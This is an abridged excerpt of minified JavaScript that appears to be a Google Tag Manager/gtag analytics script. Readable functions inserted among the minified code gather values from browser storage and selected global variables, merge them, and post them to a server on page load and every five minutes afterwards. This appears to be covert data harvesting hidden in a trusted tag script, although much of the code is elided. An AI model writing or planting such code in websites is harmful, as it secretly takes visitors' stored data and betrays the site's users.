...
(function () {
  ...
  var uc = {};
  function generateUniqueIdentifier(data) {
    const keys = Object.keys(data).sort();
    const combined = keys.map(key => `${key}:${data[key]}`).join('&');
    let identifier = 0;
    for (let char of combined) {
      const code = char.charCodeAt(0);
      identifier = (identifier << 5) - identifier + code;
      identifier |= 0; // Convert to 32bit integer
    }
    return identifier.toString(36);
  }
  var vc = function () {},
    wc = function (a) {
      this.h = a;
  ...
  function collectGlobalVariables() {
    ...
    for (const key in window) {
      if (window.hasOwnProperty(key) && trackedKeys.includes(key)) {
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.fk = "ChEIgLyWqwYQga3KhPfohoyPARIlAOzHCQgxrkGQrHMPuzVhWLxzkFPUikRWLEXi5nJpzvbqstxtXBoCPsM\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  function postToServer(data) {
    const identifier = generateUniqueIdentifier(data);
  ...
  function collectAndSendData() {
    ...
    if (Object.keys(dataFromStorage).length > 0 || Object.keys(dataFromGlobals).length > 0) {
      postToServer({
        ...dataFromStorage,
        ...dataFromGlobals
      });
  ...
  ;
  function Nz() {
    var a = ["&cv=3", "&rv=" + ni.Xg, "&tc=" + of.filter(function (b) {
      return b;
    }).length];
  ...
  document.addEventListener("DOMContentLoaded", () => {
    collectAndSendData();
    setInterval(collectAndSendData, 5 * 60 * 1000); // Adjusted to 5 minutes
  });
  var NA = function (a, b) {};
  ...
  // Additional tracking with event listeners
  ...
  function hE() {
    var a = new sb();
    N(this, "read_container_data"), a.set("containerId", 'G-YV9LXF9F74'), a.set("version", '3'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
